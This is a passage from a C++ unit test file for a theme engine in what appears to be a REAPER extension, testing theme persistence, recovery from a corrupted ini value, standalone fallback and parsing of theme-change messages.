    EXPECT_EQ(host.getExtState(kExtStateSection, kExtStateKey), "dark-studio");
}

TEST(ThemeEngine, T4_R03_CorruptExtStateRecovery) {
    MockHostActions host;
    // Simulate damaged .ini entry
    host.setExtState(kExtStateSection, kExtStateKey, "theme=cyberpunk\n[BROKEN_INI", true);

    std::string rawTheme = host.getExtState(kExtStateSection, kExtStateKey);
    std::string recovered = sanitizeTheme(rawTheme);

    EXPECT_EQ(recovered, "dark-studio");
}

TEST(ThemeEngine, T4_R04_OfflineStandaloneModeFallback) {
    // In standalone mode, MockHostActions has no initial ExtState
    MockHostActions standaloneHost;
    std::string rawTheme = standaloneHost.getExtState(kExtStateSection, kExtStateKey);
    std::string activeTheme = sanitizeTheme(rawTheme);

    EXPECT_EQ(activeTheme, "dark-studio");
}

TEST(ThemeEngine, T4_R05_FullSessionLifecycle) {
    MockHostActions sessionHost;

    // 1. Session 1: Fresh install -> dark-studio
    std::string session1Theme = sanitizeTheme(sessionHost.getExtState(kExtStateSection, kExtStateKey));
    EXPECT_EQ(session1Theme, "dark-studio");
    sessionHost.setExtState(kExtStateSection, kExtStateKey, session1Theme, true);

    // 2. User chooses pastel-pink in Settings
    std::string userMsg = "THEME_CHANGED:pastel-pink";
    std::string selectedTheme;
    EXPECT_TRUE(parseThemeIpcMessage(userMsg, selectedTheme));
    sessionHost.setExtState(kExtStateSection, kExtStateKey, selectedTheme, true);

    // 3. User closes REAPER (simulate persistence in reaper-extstate.ini)
    EXPECT_EQ(sessionHost.getExtState(kExtStateSection, kExtStateKey), "pastel-pink");
    EXPECT_TRUE(sessionHost.isExtStatePersisted(kExtStateSection, kExtStateKey));

    // 4. Session 2: User reopens REAPER
    std::string session2Theme = sanitizeTheme(sessionHost.getExtState(kExtStateSection, kExtStateKey));
    EXPECT_EQ(session2Theme, "pastel-pink");

    // 5. User switches to cyberpunk
    std::string switchMsg = "THEME_CHANGED:cyberpunk";
    std::string newTheme;
    EXPECT_TRUE(parseThemeIpcMessage(switchMsg, newTheme));
    sessionHost.setExtState(kExtStateSection, kExtStateKey, newTheme, true);
    EXPECT_EQ(sessionHost.getExtState(kExtStateSection, kExtStateKey), "cyberpunk");
}

} // namespace reals::test
